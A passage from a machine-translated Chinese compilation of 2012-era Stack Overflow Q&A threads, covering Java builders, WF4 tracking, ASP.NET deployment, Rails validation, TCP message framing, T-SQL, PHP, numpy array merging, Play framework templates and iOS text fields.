public class DataFromSpecificSources {

 private Parameter dataSource2;

 protected DataFromSpecificSources(){}

 // now this constructor is only visible within package (only for the factory in the same package)
 DataFromSpecificSources(parameter1, parameter2){
    super(parameter1); // it does not initialise data anymore

    this.dataSource2 = parameter2;
  }

  @Override
  protected void loadData(){
   ... // uses dataSources 1 and 2
  }
} 
```

现在工厂确保子类将被初始化（将加载数据）并且在其他包中不允许子类的实例化。其他类无法访问子类的构造函数，并且被迫使用工厂来获取子类的实例。

我只是想问一下我的解决方案是否正确（逻辑上），并且子类构造函数可见性仅限于包的工厂方法在这里是正确的选择吗？！还是有其他更有效的模式来解决这个问题？！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T22:59:50.757

使用工厂绝对是朝着正确方向迈出的一步。我看到的问题是，当您想要添加带有第三个参数的第三个类时会发生什么。现在你的工厂要么必须有第二个重载`createSubClass`方法来获取第三个参数，要么你的所有代码都必须重写以提供第三个参数。`null`此外，即使他们只需要单个参数类，您也强迫任何使用 Factory 的人指定第二个参数......当您到达采用 15 个参数的类时，您将如何记住哪个参数是哪个

对此的解决方案是改用 Builder 模式。

```
public class MyDataBuilder(){
    private parameter1 = null;
    private parameter2 = null;

    public MyDataBuilder withParameter1(parameter1) {
        this.parameter1 = parameter1;
        return this;
    }

    public MyDataBuilder withParameter2(parameter2) {
        this.parameter2 = parameter2;
        return this;
    }

    public Data createSubClass(){
        Data subClass;

        if (parameter2 != null){
            subClass = new DataFromSpecificSources(parameter1, parameter2);
        } else {
            subClass = new AnotherSubClass(parameter1);
        }
        subClass.loadData();
        return subClass;
    }

} 
```

现在创建 Data 实例的代码可以像这样工作：

```
Data data = new MyDataBuilder().withParameter1(param1).withParameter2(param2).create(); 
```

或者

```
Data data = new MyDataBuilder().withParameter1(param1).create(); 
```

当您添加参数 3 时，该代码是面向未来的......如果您需要，您甚至可以让构建器对参数 3 具有非空默认值。

接下来您注意到的是，您现在有了一个包含所有必需参数的漂亮 Builder 对象......所以现在您可以将 getter 添加到 Builder 并将 Builder 作为构造函数参数传递，例如

```
public class DataFromSpecificSources {
   ...

   DataFromSpecificSources(MyDataBuilder builder){
       ...
   }

   ...

} 
```

这样你现在几乎有了一个标准的构造函数签名

现在进行一些 Java 特定的改进。我们可以让构建者根本不需要知道子类！

使用 DI 框架，我们可以将实现`Data`接口/抽象类的类注入到 Builder 中，然后遍历每个类，直到找到支持 Builder 实例配置的类。

穷人的 DI 框架是自 JRE 1.6 以来可用的`/META-INF/services`契约和`ServiceLoader`类（尽管核心逻辑自 1.2 以来一直在 Java 中）

然后，您的构建器的创建方法看起来有点像

```
public Data create() {
    for (DataFactory factory: ServiceLoader.load(DataFactory.class)) {
        if (factory.canCreate(this)) {
           Data result = factory.newInstance(this);
           result.loadData();
           return result;
        }
    }
    throw new IllegalStateException("not even the default instance supports this config");
} 
```

你是否想走到那个极端是值得怀疑的......但由于你在查看其他人的代码时可能会在某个时间点遇到它，现在可能是向你指出它的好时机。

哦，我们之所以要添加一个Factory类供ServiceLoader查找是因为ServiceLoader期望调用默认构造函数，而我们隐藏了默认构造函数，所以我们使用Factory类来为我们做这些工作并允许我们将构造函数隐藏起来。

没有什么可以阻止工厂类成为数据类中的静态内部类（这使它们对正在创建的类具有很好的可见性），例如

```
public class UberData extends Data {
    private UberData(MyDataBuilder config) {
        ...
    }

    public static class Factory extends DataFactory {
        protected Data create(MyDataBuilder config) {
            return new UberData(config); 
        }
        protected boolean canCreate(MyDataBuilder config) {
            return config.hasFlanges() and config.getWidgetCount() < 7;
        }
    }
} 
```

然后我们可以列出`META-INF/services/com.mypackage.DataFactory`

```
com.mypackage.UberData.Factory
com.mypackage.DataFromSpecificSources.Factory
com.some.otherpackage.AnotherSubClass.Factory 
```

这种类型的解决方案最好的一点是它允许通过在运行时将这些实现添加到类路径来添加额外的实现......即非常松散的耦合

# workflow-foundation-4 - 为什么带有 TraceLevel 集的 CustomTrackingRecord 总是在 AppFabric 仪表板中显示为“信息”？

> ID：12427133
> 
> 赞同：1
> 
> 时间：2012-09-14T15:04:13.633
> 
> 标签：workflow-foundation-4, appfabric

AppFabric v1.1 / WF4

当我在指定文本和 Tracelevel 的 CodeActivity 中创建 CustomTrackingRecord 时，AppFabric 仪表板中的 TraceLevel 始终显示为“信息”，有人可以向我解释这是为什么吗？

```
 // Text Argument
    [DefaultValue(null)]
    public InArgument<string> Text { get; set; }

    // TraceLevel Property
    public TraceLevel TraceLevel { get; set; }

    /// <summary>
    /// Tracks the text message contained in the Text argument.
    /// </summary>
    /// <param name="context">The execution context under which the activity executes.</param>
    protected override void Execute(CodeActivityContext context)
    {
        // Obtain the runtime value of the Text and TraceLevel input arguments
        string text = context.GetValue(this.Text);

        // Create and initialize a custom tracking record 
        CustomTrackingRecord record = new CustomTrackingRecord(text, this.TraceLevel);

        // Sends the specified custom tracking record to any registered tracking providers
        context.Track(record);
    } 
```

顺便说一句，我检查了 [ASStagingTable] 和 [ASWfEventsTable] 表，我的 CustomTrackingRecords 的 TraceLevelId 始终为 4。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-06T06:57:26.160

您需要在 TrackLevel 上使用 InArgument

```
// TraceLevel Property
public InArgument<TraceLevel> TraceLevel { get; set; } 
```

然后使用上下文获取工作流运行时的值

```
// Create and initialize a custom tracking record 
CustomTrackingRecord record = new CustomTrackingRecord(text, context.GetValue(this.TraceLevel)); 
```

# asp.net - 在多个站点之间共享目录

> ID：12427134
> 
> 赞同：0
> 
> 时间：2012-09-14T15:04:16.543
> 
> 标签：asp.net, visual-studio-2010, visual-studio

我们为我们的各个公司/部门提供了几个不同的 Intranet 站点。它们之间的许多内容都是独一无二的，但它们确实有一些共享的组件。

我们当前的部署设置（很糟糕）涉及使用 Visual Studio 中的复制网站工具在项目目录和服务器上的部署位置之间复制/同步文件。然后在服务器上的 IIS 中，我们可以设置虚拟目录指向共享项（主要是 .aspx 页面）。这些页面在站点的根目录中查找标准母版页，因此可以在具有各自品牌的每个单独站点中正常工作。

几个例子：

*   /假期日历
*   /电话目录
*   /控件（.ascx 文件）

虽然它在生产中运行良好，但由于多种原因它很糟糕：

*   复制网站工具很糟糕。
*   您无法在本地调试这些组件，因为它们实际上并不存在于站点中。
*   该站点没有预编译，这带来了明显的性能问题。

所以我想扔掉所有的废话，转而使用预编译的站点，通过一个 Web 部署项目将所有内容都放在服务器上。这就提出了如何处理共享组件的问题。我很确定在这种环境中我无法摆脱虚拟目录的伎俩，坦率地说，我真的不想这样做。

如何使 .aspx/.ascx 文件和关联的图像/脚本/CSS 资源的子目录有点像类库？假设我将 VacationCalendar 目录中的所有内容放入其自己的项目/解决方案中，然后让每个 Intranet 站点导入它并使所有这些文件在 /VacationCalendar 路径下可用。有没有什么方法可以做这样的事情而不会让人头疼？

我真的不想将所有这些站点合并到一个解决方案中，因为总是有可能需要在源代码控制中限制访问。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T23:23:17.253

免责声明-我没有尝试过。

在他们自己的项目中创建共享目录作为子目录。将这些项目部署到禁用站点下的网络服务器，但从活动站点链接到那里的实际子目录。

所以在 IIS 中你可以有

```
+ - DisabledWebsite
|   |
|   + --- PhoneProject
|         |
|         + --- PhoneDir (at c:/webs/PhoneProject/PhoneDir
|
+ - EnabledSite
    |
    + --- RealProject (bound to http:something.com for example)
          |
          +-- PhoneDir (virtual linked to c:/webs/PhoneProject/PhoneDir 
```

然后，您可以编译 PhoneProject 并将其与 RealProject 分开部署。您可能还必须为 PhoneProject 提供一个单独的命名空间，并将其编译后的 dll 放入 RealProject/bin 目录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:20:25.793

是不是很明显或者我的想法很糟糕。反正：

制作一个母版页，链接所有网站（预编译）并拥有：

*   在保存在某个特定目录中的每个站点上上传（仅适用于该站点）
*   母版页上的全局上传，将所有文件保存在同一目录中（每个人都可用）

母版页可以有一个所有共享资源的目录，并且每个站点可以有一个不同的文件夹。没有混乱。您甚至可以要求登录某些目录，并设置权限

# ruby-on-rails - Rails：验证 2 列的唯一组合

> ID：12427136
> 
> 赞同：3
> 
> 时间：2012-09-14T15:04:27.757
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1

leave_policy 是具有列的表：id，：group_detail_id，employee_type_id，

我想组合 :group_detail_id 和 employee_type_id 不应该重复。

validates_uniqueness_of :employee_type_id ,:scope => :group_detail_id

这条线不工作......我不知道为什么？？？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T22:18:40.860

尝试：

```
validate :unique_combination

def unique_combination
  self.class.exists?(
    :employee_type_id => employee_type_id,
    :group_detail_id => group_detail_id
  )
end 
```

# c# - DataGridView CalendarColumn 仅在单击时出现

> ID：12427137
> 
> 赞同：1
> 
> 时间：2012-09-14T15:04:31.090
> 
> 标签：c#, .net, winforms, datagridview

按照这个例子：

[http://msdn.microsoft.com/en-us/library/7tas5c80.aspx](http://msdn.microsoft.com/en-us/library/7tas5c80.aspx)

但是，在运行时，当我向 DataGridView 添加行并显示它们时，包含 CalendarColumn 的列是空白的，直到我单击它。然后，只要我单击其他任何地方，该列就会再次变为空白。因此，只有在您与之交互的确切时刻才能看到它。

有什么想法可能导致这种情况吗？

编辑：只有代码的相关部分。休息是通过设计师完成的。

```
 private void LoadScheduleView()
    {
        // Get the keys
        var scheduleNames = _schedules.Current.Keys;

        // Get the current scheduled objects based on the keys (layoutnames).
        foreach (var scheduleName in scheduleNames)
        {
            var schedule = _schedules.Current[scheduleName];
            // Add the already existing schedule to the data grid view.
            schedulesDataGrid.Rows.Add(schedule.Date, schedule.Layout, schedule.CloseAllWindows);
        }
        //schedulesDataGrid.Sort(schedulesDataGrid.Columns[0], ListSortDirection.Ascending);

        DateTime scheduledTime = new DateTime();
        var rowsToLoop = schedulesDataGrid.Rows;
        foreach (DataGridViewRow row in rowsToLoop)
        {
            scheduledTime = (DateTime)row.Cells[0].Value;

            if (scheduledTime < DateTime.Now)
            {
                schedulesDataGrid.Rows.Remove(row);
            }

            //This will happen in sorted list order, therefore the first time it's after DateTime.Now, it will be the next layout to launch.
            else
            {
                var indexOfNextSchedule = schedulesDataGrid.Rows.IndexOf(row);
                schedulesDataGrid.FirstDisplayedScrollingRowIndex = indexOfNextSchedule;
                //schedulesDataGrid.Rows[indexOfNextSchedule].Selected = true;
                break;
            }
        }  
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:15:01.300

似乎问题在于 是从而不是`CalendarCell`从 派生的。如果我发现这会导致任何进一步的问题，我会报告...`DataGridViewCell``DataGridViewTextBoxCell`

# windows - Windows 凭据漫游 - 如何将受密码保护的密钥发送到 AD 服务器？

> ID：12427138
> 
> 赞同：0
> 
> 时间：2012-09-14T15:04:33.360
> 
> 标签：windows, winapi, dpapi

我试图弄清楚如何实现 Windows 凭据漫游。我发现它会漫游受密码严格保护的证书（CryptProtectData() 的可选熵）。

除非 Windows 在导入证书时在某处保留密码副本，否则我看不到如何做到这一点。将 %APPDATA%/Crypto/RSA{UserSID} 中的文件复制到另一台机器将不起作用，因为密钥是使用用户 DPAPI 主密钥和可选密码加密的。

除了使用 ProcMon 之外，我不知道还有什么可以尝试或查看以解决这个问题。任何有助于解决这个问题的指针将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:16:34.807

[CryptProtectData](http://msdn.microsoft.com/en-us/library/windows/desktop/aa380261.aspx)做了更多的事情，使整个事情成为可能。

DPAPI 将生成用于加密的密钥。然后，DPAPI 密钥将使用从您的密码派生的另一个密钥进行加密。

在凭证漫游中发送的是 DPAPI 密钥，而不是您的密码。

当您更改密码时，这也允许 DPAPI 继续（本地）工作。否则，Windows 将不得不跟踪存储在各处（文件、注册表项等）的 DPAPI 加密 blob，以加密到新的密码派生密钥。有无限数量的应用程序，使其成为不可能。

相反，密钥位于一个众所周知且隐藏良好的位置，用户永远不会看到。Windows 可以轻松地使用新密码重新加密 DPAPI，从而保护使用它的应用程序免受密码更改的影响。

凭证漫游也使用相同的机制来保持用户密码的独立性。

这个网站有[提取SYSTEM账户DPAPI密钥的代码](http://www.passcape.com/index.php?section=docsys&cmd=details&id=23)，以及一些结构信息，可能对你调试有帮助。

# java - 如何接收通过 TCP 套接字发送的相同消息？

> ID：12427139
> 
> 赞同：0
> 
> 时间：2012-09-14T15:04:38.023
> 
> 标签：java, sockets, tcp, client-server

我有一个 Java 中的 TCP 套接字客户端-服务器程序。

从客户端，我每秒钟发送几次二进制消息（来自字节 [] 的二进制数据）。

从服务器，我想以相同的顺序和大小读取这些消息。

问题是服务器显然并不总是以相同大小读取消息。它似乎将它们“分组”。例如：

客户端发送：12字节 - 12字节 - 12字节 - 12字节 - 15字节 - 15字节

服务器接收：12字节 - 48字节 - 15字节 - 15字节

我怎样才能防止这种情况？

现在，我的代码是：

客户：

```
(initialization)
mySocket = new Socket(direccion, puerto);
mySocket.setTcpNoDelay(true);
BufferedOutputStream os = new BufferedOutputStream( mySocket.getOutputStream() );

(sending)
os.write( bytes );
os.flush(); 
```

服务器

```
(initialization)
serverSocket = new ServerSocket(12321);
Socket con = serverSocket.accept();
reader = new BufferedReader(new InputStreamReader(con.getInputStream()));

(receiving)
char[] msg = new char[1024];
String mensaje;
int nbytes;
nbytes = reader.read(msg); 
```

我不能手动分离分组的消息，因为它们是二进制消息，这个模块不能“理解”它们。

所以，问题是：我如何确保读者单独收到消息？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:53:22.670

您正在使用数据*流*来传输您的消息。流在概念上只是一个字节序列——没有*消息*。您需要自己负责将流拆分为消息/数据包。您甚至可以在当前代码中通过一次读取调用接收消息的一部分，并通过下一次调用接收下一部分消息。就像现在一样，您的代码存在根本缺陷。

引入一种机制，可以清楚地检测消息开始/结束的位置。一种简单的方法是将每个数据包的长度编码到每个数据包的第一个字节中。然后接收器可以首先读取长度，然后它知道有多少以下字节属于该数据包。

另一种方法是使用一个消息分隔符来表示当前数据包的结束。由于您正在发送二进制数据，这将要求数据包不包含所有可能的字节值，或者您需要以不使用每个可能的字节值的方式对数据包进行编码。

具有长度的方法实现起来要简单得多，而*结束符号*方法对于您可以轻松引入新符号的方案很有用（例如，如果整个数据包都经过霍夫曼编码）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:13:02.143

它们传输流是 TCP 连接的本质。

你的选择是

1.  手动分隔消息，例如通过在每条消息前面添加一个长度字段。这需要更改协议。

2.  使用不同于 TCP 的协议。UDP（但你会失去可靠性）或 STCP（我不确定 Java 是否能够做到这一点）。

# tsql - MS SQL Server 2008/2012 获取任意两个值之间的最小差异

> ID：12427142
> 
> 赞同：2
> 
> 时间：2012-09-14T15:04:41.857
> 
> 标签：tsql, sql-server-2012

给定一个具有单列的表，`money`我如何计算该表中任意两个值之间的最小差异`TSQL`？我正在寻找性能优化的解决方案，它可以处理数百万行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T20:13:52.813

对于 SQL Server 2012，您可以使用

```
;WITH CTE
     AS (SELECT YourColumn - Lag(YourColumn) OVER (ORDER BY YourColumn) AS Diff
         FROM   YourTable)
SELECT 
      Min(Diff) AS MinDiff
FROM   CTE 
```

这是通过对表进行一次扫描来完成的（理想情况下，您将有一个索引`YourColumn`以避免排序，并且该单列上的窄索引会减少 IO）。

我想不出一种让它短路的好方法，所以如果它发现最小可能的差异为零，则对表进行少于一次扫描。添加`MIN(CASE WHEN Diff = 0 THEN 1/0 END)`到`SELECT`列表中并捕获除以零错误作为找到零的信号可能会起作用，但我真的不能推荐这种方法......

# php - 如果使用PHP为空，则添加到锚的空文本节点

> ID：12427143
> 
> 赞同：0
> 
> 时间：2012-09-14T15:04:43.890
> 
> 标签：php, regex

我正在开发一个使用电子商务插件的 WP 网站；除其他外，此插件存储和检索产品图像。麻烦的是，如果产品没有分配图像，它会返回一个在文本节点中没有任何内容的锚标记，如下所示：

```
<a id="product_image_id" href="..."></a> 
```

我不想弄乱插件的核心功能，这样我就可以留在升级路径上，并想使用 PHP 检查返回的字符串是否有空文本节点并将其替换为“没有可用的图像” ' 像这样的图像：

```
<a id="product_image_id" href="..."><img src="..." /></a> 
```

我已经尝试了各种 PHP 子字符串/替换函数，但都没有成功，并且碰壁了。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:26:05.387

很高兴你解决了！

我想到了一个基于 SimpleXmlElement 的解决方案：

```
$xs2 = '<a id="product_image_id" href="..."><img src="..." /></a>';
$xml = new SimpleXMLElement($xs2);

foreach ($xml->children() as $child)
  echo $child->getName(); 
```

通过观察孩子，很容易看出是否存在图像。我没有，添加一个节点并返回`SimpleXMLElement->asXml`;

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:18:51.113

对于任何有兴趣的人，这是我解决它的方法：

```
$thumbnail = function_that_returns_formatted_image();
$thumbnail_content = strip_tags($thumbnail, '<img>'); // Strip out </a> and ignore </img>
if (empty($thumbnail_content)) // Check for </img> tag
    $thumbnail = '<img src="/path/to/temporary_image.jpg" />'; 
```

我希望这可以帮助别人！

# python - 合并两个数组并排序

> ID：12427146
> 
> 赞同：19
> 
> 时间：2012-09-14T15:04:53.463
> 
> 标签：python, numpy

给定两个排序数组，如下所示：

```
a = array([1,2,4,5,6,8,9])

b = array([3,4,7,10]) 
```

我希望输出为：

```
c = array([1,2,3,4,5,6,7,8,9,10]) 
```

或者：

```
c = array([1,2,3,4,4,5,6,7,8,9,10]) 
```

我知道我可以执行以下操作：

```
c = unique(concatenate((a,b)) 
```

我只是想知道是否有更快的方法来做到这一点，因为我正在处理的数组有数百万个元素。

欢迎任何想法。谢谢

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-09-14T15:30:34.787

由于您使用 numpy，我怀疑 bisec 是否对您有帮助……因此，我建议做两件事：

1.  不要*使用*`np.sort`, 使用方法`c.sort()`来对数组进行就地排序并避免复制。
2.  `np.unique`必须使用`np.sort`哪个不到位。因此，不要使用`np.unique`手动执行逻辑。IE。首先排序（就地）然后`np.unique`手动执行该方法（还要检查它的python代码），`flag = np.concatenate(([True], ar[1:] != ar[:-1]))`使用 which `unique = ar[flag]`（对 ar 进行排序）。为了更好一点，您可能应该自行进行标志操作，即。`flag = np.ones(len(ar), dtype=bool)`然后`np.not_equal(ar[1:], ar[:-1], out=flag[1:])`基本上避免了`flag`.
3.  我不确定这一点。但是`.sort`有 3 种不同的算法，因为您的数组可能几乎已经排序，更改排序方法可能会产生速度差异。

这将使完整的东西接近你所得到的（没有事先做一个独特的）：

```
def insort(a, b, kind='mergesort'):
    # took mergesort as it seemed a tiny bit faster for my sorted large array try.
    c = np.concatenate((a, b)) # we still need to do this unfortunatly.
    c.sort(kind=kind)
    flag = np.ones(len(c), dtype=bool)
    np.not_equal(c[1:], c[:-1], out=flag[1:])
    return c[flag] 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-09-14T15:41:47.800

将元素插入到 an 的中间`array`是一个非常低效的操作，因为它们在内存中是平坦的，因此每当您插入另一个元素时，您都需要将所有内容都移动。因此，您可能不想使用`bisect`. 这样做的复杂性大约是 `O(N^2)`.

您当前的方法是`O(n*log(n))`，因此要好得多，但并不完美。

将所有元素插入哈希表（例如 a `set`）是一件事情。uniquify需要一些`O(N)`时间，但是你需要排序哪一个需要`O(n*log(n))`. 还是不太好。

真正的`O(N)`解决方案涉及分配一个数组，然后通过获取输入列表的最小头部来一次填充一个元素，即。合并。不幸的是`numpy`，Python 似乎都没有这样的东西。解决方案可能是在 Cython 中编写一个。

它看起来很模糊，如下所示：

```
def foo(numpy.ndarray[int, ndim=1] out,
        numpy.ndarray[int, ndim=1] in1, 
        numpy.ndarray[int, ndim=1] in2):

        cdef int i = 0
        cdef int j = 0
        cdef int k = 0
        while (i!=len(in1)) or (j!=len(in2)):
            # set out[k] to smaller of in[i] or in[j]
            # increment k
            # increment one of i or j 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-09-14T15:34:28.827

当对时间感到好奇时，最好只是`timeit`. 下面，我列出了各种方法的一个子集及其时间：

```
import numpy as np
import timeit
import heapq

def insort(a, x, lo=0, hi=None):
    if hi is None: hi = len(a)
    while lo < hi:
        mid = (lo+hi)//2
        if x < a[mid]: hi = mid
        else: lo = mid+1
    return lo, np.insert(a, lo, [x])

size=10000
a = np.array(range(size))
b = np.array(range(size))

def op(a,b):
    return np.unique(np.concatenate((a,b)))

def martijn(a,b):
    c = np.copy(a)
    lo = 0
    for i in b:
        lo, c = insort(c, i, lo)
    return c

def martijn2(a,b):
    c = np.zeros(len(a) + len(b), a.dtype)
    for i, v in enumerate(heapq.merge(a, b)):
        c[i] = v

def larsmans(a,b):
    return np.array(sorted(set(a) | set(b)))

def larsmans_mod(a,b):
    return np.array(set.union(set(a),b))

def sebastian(a, b, kind='mergesort'):
    # took mergesort as it seemed a tiny bit faster for my sorted large array try.
    c = np.concatenate((a, b)) # we still need to do this unfortunatly.
    c.sort(kind=kind)
    flag = np.ones(len(c), dtype=bool)
    np.not_equal(c[1:], c[:-1], out=flag[1:])
    return c[flag] 
```

结果：

```
martijn2     25.1079499722
OP       1.44831800461
larsmans     9.91507601738
larsmans_mod     5.87612199783
sebastian    3.50475311279e-05 
```

我在这里的具体贡献是`larsmans_mod`避免创建 2 个集合——它只创建 1 个，这样做可以将执行时间减少近一半。

**编辑**被删除`martijn`，因为它太慢而无法竞争。还测试了稍大的数组（排序）输入。我也没有测试输出的正确性......

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-09-14T15:14:19.133

除了关于 using 的其他答案`bisect.insort`，如果您对性能不满意，您可以尝试使用[`blist`](http://stutzbachenterprises.com/blist/)module with `bisect`。它应该提高性能。

传统的`list` [插入复杂度是`O(n)`](http://wiki.python.org/moin/TimeComplexity#list)，而插入[`blist`的复杂度是`O(log(n))`](http://stutzbachenterprises.com/blist/blist.html#blist.blist.L.insert)。

此外，您的数组似乎已排序。如果是这样，您可以使用mudule 中的`merge`函数`heapq`来利用两个数组都已预先排序的事实。由于在内存中创建了一个新数组，因此这种方法会产生开销。这可能是一个考虑的选项，因为这个解决方案的时间复杂度是`O(n+m)`，而具有 insort 的解决方案是`O(n*m)`复杂的（n 个元素 * m 个插入）

```
import heapq

a = [1,2,4,5,6,8,9]
b = [3,4,7,10]

it = heapq.merge(a,b) #iterator consisting of merged elements of a and b
L = list(it) #list made of it
print(L) 
```

输出：

```
[1, 2, 3, 4, 4, 5, 6, 7, 8, 9, 10] 
```

如果要删除重复值，可以使用[groupby](http://docs.python.org/library/itertools.html#itertools.groupby)：

```
import heapq
import itertools

a = [1,2,4,5,6,8,9]
b = [3,4,7,10]

it = heapq.merge(a,b) #iterator consisting of merged elements of a and b
it = (k for k,v in itertools.groupby(it))
L = list(it) #list made of it
print(L) 
```

输出：

```
[1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-09-14T15:06:30.613

您可以使用该[`bisect`模块](http://docs.python.org/library/bisect.html)进行此类合并，将第二个 python 列表合并到第一个。

这些`bisect*`函数适用于 numpy 数组，但`insort*`函数不适用。[使用模块源代码](http://hg.python.org/cpython/file/tip/Lib/bisect.py)来调整算法很容易，它非常基础：

```
from numpy import array, copy, insert

def insort(a, x, lo=0, hi=None):
    if hi is None: hi = len(a)
    while lo < hi:
        mid = (lo+hi)//2
        if x < a[mid]: hi = mid
        else: lo = mid+1
    return lo, insert(a, lo, [x])

a = array([1,2,4,5,6,8,9])
b = array([3,4,7,10])

c = copy(a)
lo = 0
for i in b:
    lo, c = insort(c, i, lo) 
```

并不是说自定义`insort`真的在这里添加了任何东西，默认`bisect.bisect`也可以正常工作：

```
import bisect

c = copy(a)
lo = 0
for i in b:
    lo = bisect.bisect(c, i)
    c = insert(c, i, lo) 
```

使用这种改编`insort`比组合和排序更有效。因为`b`也是排序的，所以我们可以跟踪`lo`插入点并从那里开始搜索下一个点，而不是在每个循环中考虑整个数组。

如果您不需要保存`a`，只需直接对该数组进行操作并保存副本即可。

更高效：因为两个列表都是排序的，我们可以使用`heapq.merge`：

```
from numpy import zeros
import heapq

c = zeros(len(a) + len(b), a.dtype)
for i, v in enumerate(heapq.merge(a, b)):
    c[i] = v 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-14T15:10:12.457

为此使用该[`bisect`模块](http://docs.python.org/library/bisect.html)：

```
import bisect

a = array([1,2,4,5,6,8,9])
b = array([3,4,7,10])

for i in b:
    pos = bisect.bisect(a, i)
    insert(a,[pos],i) 
```

我现在无法测试这个，但它[应该可以](http://www.scipy.org/Numpy_Example_List#head-0104ad508975a2475c5d2bbad3c796a2921654ae)工作

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-05-22T20:29:00.600

sortednp包实现了排序后的 numpy[数组](https://gitlab.sauerburger.com/frank/sortednp)的有效合并，只是对值进行排序，而不是使它们唯一：

```
import numpy as np
import sortednp
a = np.array([1,2,4,5,6,8,9])
b = np.array([3,4,7,10])
c = sortednp.merge(a, b) 
```

我测量了时间并将它们在[这个答案中与一个类似的帖子进行了](https://stackoverflow.com/a/61963265/3581794)比较，其中它优于 numpy 的合并排序（v1.17.4）。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-08-28T17:44:23.287

似乎没有人提到`union1d`（[union1d](https://docs.scipy.org/doc/numpy-1.10.1/reference/generated/numpy.union1d.html)）。目前，它是 的快捷方式`unique(concatenate((ar1, ar2)))`，但它是一个要记住的短名称，并且它有可能被 numpy 开发人员优化，因为它是一个库函数。`insort`它的性能与seberg 接受的大型数组答案非常相似。这是我的基准：

```
import numpy as np

def insort(a, b, kind='mergesort'):
    # took mergesort as it seemed a tiny bit faster for my sorted large array try.
    c = np.concatenate((a, b))  # we still need to do this unfortunatly.
    c.sort(kind=kind)
    flag = np.ones(len(c), dtype=bool)
    np.not_equal(c[1:], c[:-1], out=flag[1:])
    return c[flag]

size = int(1e7)
a = np.random.randint(np.iinfo(np.int).min, np.iinfo(np.int).max, size)
b = np.random.randint(np.iinfo(np.int).min, np.iinfo(np.int).max, size)

np.testing.assert_array_equal(insort(a, b), np.union1d(a, b))

import timeit
repetitions = 20
print("insort: %.5fs" % (timeit.timeit("insort(a, b)", "from __main__ import a, b, insort", number=repetitions)/repetitions,))
print("union1d: %.5fs" % (timeit.timeit("np.union1d(a, b)", "from __main__ import a, b; import numpy as np", number=repetitions)/repetitions,)) 
```

我机器上的输出：

```
insort: 1.69962s
union1d: 1.66338s 
```

# scala - playframework 视图引擎，它仍然只是基于 groovy 吗？

> ID：12427152
> 
> 赞同：0
> 
> 时间：2012-09-14T15:05:15.217
> 
> 标签：scala, playframework

我正在阅读 playframework 如何使用一些基于 groovy 的视图引擎，并且该视图引擎存在一些性能问题。

游戏是否仍然与此视图引擎相关联，或者是否有与框架一起提供的可行替代方案（或者不需要任何实质性的黑客来使其工作）。

另外，我正在阅读 playframework 如何使用 python 生成命令行代码等，有人可以指出它所在的源代码吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T21:06:04.187

*   [Japid](http://playframework.org/modules/japid)已经存在很长时间了，它具有最好的性能，因为它将模板编译成字节码。
*   与 Japid 一样，[Rythm](http://playframework.org/modules/rythm)也将模板编译为字节码，而且速度也非常快。它使用优雅的 .net Razor 语法，并提供更好的 Play!Framework 集成。[在这里](http://rythmengine.com)查看完整的演示，注意它在 GAE 上运行。
*   Play!framework 还有其他一些模板引擎，包括[thymeleaf](http://www.playframework.org/modules/thymeleaf)和[cambridge](http://code.google.com/p/cambridge/wiki/UsingWithPlayFramework)

以上都是针对 play-1.x 的，而 Japid 也在[github 上](https://github.com/branaway/japid42)提供了 play-2.x 的集成。

python 东西的源代码可以在`${PLAY_ROOT}/framework/pym`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:14:41.500

[Play 的模块](http://www.playframework.org/modules)中至少有 3 个模板引擎，而且它们已经存在很长时间了。

也可以在[playmodules.net上找到](http://www.playmodules.net/module/list?nameFilter=template&versionFilter=1&inputTagFilter=)

当然 Play 2.0 带来了基于 Scala 的新模板引擎

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T23:17:53.040

我认为 Play 中基于 Scala 的模板！2.x 绝对是要走的路。

我用过很多。但这很容易是最好的。它也与 Play 紧密结合！开发过程和我在它上面运行的eclipse。

# ios5 - 将 UITextView 转换为 UITextField

> ID：12427153
> 
> 赞同：1
> 
> 时间：2012-09-14T15:05:20.497
> 
> 标签：ios5, casting, uitextfield, uitextview

这似乎是一个非常简单的问题，但是我还没有找到一个简单的选项......

我有一系列 UITextFields，后跟一个 UITextView。如何在下面的相同方法中合并 TextFields 和 TextView。

```
-(BOOL) textFieldDidBeginEditing:(UITextField *) textField{
textField = activeField;
if([self.textField1 isFirstResponder]){activeField = textField1;}
else if([self.textField2 isFirstResponder]){activeField = textField2;}
else if([self.textField3 isFirstResponder]){activeField = textField3;}
else if([self.textView1 isFirstResponder]){ activeField = textView1;}

[scrollView1 scrollRectToVisible:[activeField frame] animated:YES];

return NO;
} 
```

最后一行导致以下警告：

***从“UITextView ** _strong”分配给“UITextField *_strong”的不兼容指针类型**

这是由于（我确定）UITextField 和 UITextView 是不同的对象这一明显事实......这很好但是有办法解决这个问题，因为我希望能够通过 textFields 和 TextViews带有下一个和上一个按钮。

按照这个方法

```
-(void) nextTextField:(id)sender{
if([self.textField1 isFirstResponder]){activeField = textField2;}
else if([self.textField2 isFirstResponder]){activeField = textField3;}
